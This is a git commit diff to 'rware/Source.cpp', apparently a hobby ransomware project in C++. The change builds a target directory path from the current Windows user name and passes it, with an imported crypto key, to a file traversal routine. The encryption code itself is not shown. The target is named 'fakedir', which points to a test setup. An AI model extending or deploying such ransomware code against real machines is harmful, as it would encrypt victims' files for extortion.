48acfe6ab081f2cb13b68ac37c2753828ff80740
KorielZeth <110422274+KorielZeth@users.noreply.github.com>
2022-08-22 00:46:11 +0200

    gui 2bd

--- rware/Source.cpp
+++ rware/Source.cpp
@@ -1,7 +1,6 @@
 #include <iostream>
 #include <Windows.h>
-#include <string>
-
+#include "strsafe.h"
 
 
 
@@ -15,19 +14,24 @@ HCRYPTKEY keyimport();
 
 //Main
 
-int wmain() {
+int main() {
 
-	//TODO ; use the getusername func and a bit of string manipulation for the dirs absolute path
+	//TODO ; use the getusername func and a bit of string manipulation for the dirs absolute path C:\\[name]\\fakedir\\
 
-	LPCWSTR targetDirs[] = { L"C:\\dev\\fake_dir" };
+	LPCWSTR targetDirs[] = { L"\\fakedir" };
+	WCHAR name[60];
+	DWORD size = sizeof(name) / sizeof(name[0]);
+	GetUserName(name, &size);
 	
 
 	HCRYPTKEY key = keyimport();
 
 	for (LPCWSTR singledir : targetDirs) {
 		
-		
-		traverse(singledir,key);
+		WCHAR absoluteDirPath[MAX_PATH] = L"C:\\";
+		StringCchCatW(absoluteDirPath, MAX_PATH, name);
+		StringCchCatW(absoluteDirPath, MAX_PATH, singledir);
+		traverse(absoluteDirPath,key);
 	}
 
 	return 0;
